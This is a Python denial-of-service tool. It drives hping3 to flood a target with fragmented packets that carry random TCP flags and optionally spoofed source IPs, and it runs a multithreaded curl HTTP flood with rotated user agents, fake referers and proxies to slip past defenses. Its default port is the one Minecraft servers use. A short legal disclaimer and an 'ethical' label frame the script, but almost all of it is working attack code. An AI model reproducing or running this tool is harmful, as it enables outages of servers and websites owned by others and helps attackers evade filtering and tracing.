#!/usr/bin/env python3

import argparse
import subprocess
import logging
import sys
import re
import random
import time
import threading
from colorama import Fore, Style, init
from datetime import datetime

init(autoreset=True)

DISCLAIMER = f"""{Fore.YELLOW}
------------------------------------------------------------------------------------
 This tool is intended for authorized network security testing only.
 Unauthorized use against networks you don't own or have permission to test is illegal.
 The developer assumes no liability for misuse.
------------------------------------------------------------------------------------
{Style.RESET_ALL}
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
]

REFERERS = [
    "https://google.com",
    "https://bing.com",
    "https://github.com",
    "https://twitter.com",
    "https://youtube.com"
]

class PacketSenderTool:
    def __init__(self):
        self.setup_logging()
        logging.info("PacketSenderTool initialized.")

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s: %(message)s',
            handlers=[logging.StreamHandler(sys.stdout)]
        )

    def validate_target(self, target):
        logging.info("Validating target...")
        ipv4_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
        hostname_pattern = re.compile(r"^(?=.{1,253}$)(?!\-)([a-zA-Z0-9\-]{1,63}\.?)+$")
        if not (ipv4_pattern.match(target) or hostname_pattern.match(target)):
            logging.error("Invalid target address provided.")
            sys.exit(1)
        logging.info("Target validation passed.")

    # -------- Layer 4 --------
    def perform_layer4_attack(self, target, port, method='udp', count=100, spoof_ip=False):
        self.validate_target(target)
        logging.info(f"Starting Layer 4 ({method.upper()}) attack on {target}:{port}")

        flags_list = ['S', 'A', 'F', 'R', 'U', 'PA', 'SF', 'RA']  # SYN, ACK, FIN, RST, URG, etc.

        try:
            for i in range(count):
                flags = random.choice(flags_list)
                spoof_arg = ["-a", self.random_ip()] if spoof_ip else []
                cmd = [
                    "sudo", "hping3", target,
                    "-p", str(port),
                    f"-{method[0]}",
                    "-c", "1",
                    "--flood",
                    "--win", str(random.randint(64, 65535)),
                    "-f",  # fragment
                    "-F", flags,
                    "--interval", f"u{random.randint(100, 1000)}"
                ] + spoof_arg

                logging.debug(f"Sending L4 packet with flags: {flags} | Spoof: {spoof_ip}")
                subprocess.Popen(cmd)
                time.sleep(0.01)

            logging.info("Layer 4 bypass packets sent.")
        except Exception as e:
            logging.error(f"Layer 4 error: {e}")

    def random_ip(self):
        return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    # -------- Layer 7 --------
    def perform_layer7_attack(self, target_url, count=100, proxy_list=None):
        logging.info(f"Starting Layer 7 bypass attack on {target_url}")

        def send_request():
            try:
                for _ in range(count):
                    headers = {
                        "User-Agent": random.choice(USER_AGENTS),
                        "Referer": random.choice(REFERERS),
                        "Accept": "text/html,application/xhtml+xml",
                        "Connection": "keep-alive"
                    }

                    curl_cmd = [
                        "curl", "-s", "-X", "GET", target_url,
                        "-A", headers["User-Agent"],
                        "-e", headers["Referer"],
                        "-H", f"Accept: {headers['Accept']}",
                        "-H", f"Connection: {headers['Connection']}",
                        "--max-time", "5"
                    ]

                    if proxy_list:
                        proxy = random.choice(proxy_list)
                        curl_cmd += ["--proxy", proxy]
                        logging.debug(f"Using proxy: {proxy}")

                    subprocess.Popen(curl_cmd)
                    time.sleep(random.uniform(0.1, 0.5))
            except Exception as e:
                logging.error(f"L7 error: {e}")

        threads = []
        for _ in range(10):  # concurrent simulated async threads
            t = threading.Thread(target=send_request)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        logging.info("Layer 7 flood completed.")

def load_proxy_list(file_path):
    try:
        with open(file_path, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(proxies)} proxies.")
        return proxies
    except Exception as e:
        logging.warning(f"Failed to load proxies: {e}")
        return []

def parse_arguments():
    parser = argparse.ArgumentParser(
        description='Ethical Packet Sender Tool using Hping3 (Layer 4/7)',
        epilog='Example: sudo python3 Main.py --l4 --target 1.2.3.4 --port 25565 --method udp --bypass'
    )
    parser.add_argument('--l4', action='store_true', help='Execute Layer 4 attack')
    parser.add_argument('--l7', action='store_true', help='Execute Layer 7 attack')
    parser.add_argument('--target', type=str, required=True, help='Target IP/domain')
    parser.add_argument('--port', type=int, default=25565, help='Target port (default: 25565)')
    parser.add_argument('--method', type=str, choices=['tcp', 'udp'], default='udp', help='Protocol for Layer 4')
    parser.add_argument('--url', type=str, help='URL for Layer 7 attack')
    parser.add_argument('--count', type=int, default=100, help='Number of packets/requests')
    parser.add_argument('--bypass', action='store_true', help='Enable bypass mode')
    parser.add_argument('--proxyfile', type=str, help='Path to proxy list (optional for L7)')
    return parser.parse_args()

def main():
    print(DISCLAIMER)
    args = parse_arguments()
    tool = PacketSenderTool()

    proxies = load_proxy_list(args.proxyfile) if args.proxyfile else None

    if args.l4:
        tool.perform_layer4_attack(
            target=args.target,
            port=args.port,
            method=args.method,
            count=args.count,
            spoof_ip=args.bypass
        )

    elif args.l7:
        if not args.url:
            logging.error("Layer 7 attack requires --url.")
            sys.exit(1)
        tool.perform_layer7_attack(
            target_url=args.url,
            count=args.count,
            proxy_list=proxies if args.bypass else None
        )

    else:
        logging.warning("No attack type selected. Use --l4 or --l7.")
        sys.exit(1)

if __name__ == '__main__':
    main()
